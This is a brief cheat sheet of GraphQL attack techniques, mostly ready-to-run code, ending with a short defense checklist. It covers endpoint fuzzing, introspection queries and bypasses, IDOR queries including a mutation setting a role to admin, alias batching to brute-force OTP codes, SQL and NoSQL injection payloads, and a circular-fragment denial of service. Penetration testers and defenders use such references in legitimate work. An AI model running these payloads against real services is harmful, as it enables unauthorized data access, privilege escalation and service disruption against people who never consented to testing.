# GraphQL Security: Advanced Attacks

## Discovery
```bash
ffuf -u https://target.com/FUZZ -w graphql-endpoints.txt
# /graphql, /v1/graphql, /graph, /api/graphql, /gql, /query

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

## Introspection Bypass
```graphql
# Try __type if __schema is blocked
{ __type(name: "User") { name fields { name type { name } } } }
```
Use Clairvoyance when introspection is disabled (reconstructs schema from error suggestions).

## IDOR in GraphQL
```graphql
# Direct IDOR
query { user(id: 123) { email role internalNote } }

# Batch alias IDOR
query {
  u1: user(id: 1) { email role payments { amount } }
  u2: user(id: 2) { email role payments { amount } }
}

# Mutation IDOR
mutation { updateUser(id: 456, input: {role: "admin"}) { success } }
```

## Rate Limit Bypass via Aliases
```graphql
mutation {
  a: verifyOTP(otp: 0000) { success }
  b: verifyOTP(otp: 0001) { success }
  # All 10k possibilities in batches of 100
}
```

## Injection via Resolvers
```graphql
# SQLi
query { search(term: "' OR '1'='1") { results } }

# NoSQLi
query { findUser(query: "{\"$where\":\"this.password.startsWith('a')\"}") { email } }
```

## DoS via Depth & Complexity
```graphql
# Circular fragments
query { ...x }
fragment x on Query { ...x }
```

## Defense Checklist
- Query depth limits
- Cost analysis
- Rate limiting per operation (not request)
- Resolver-level auth
- Introspection disabled in production
- Persisted queries enforced
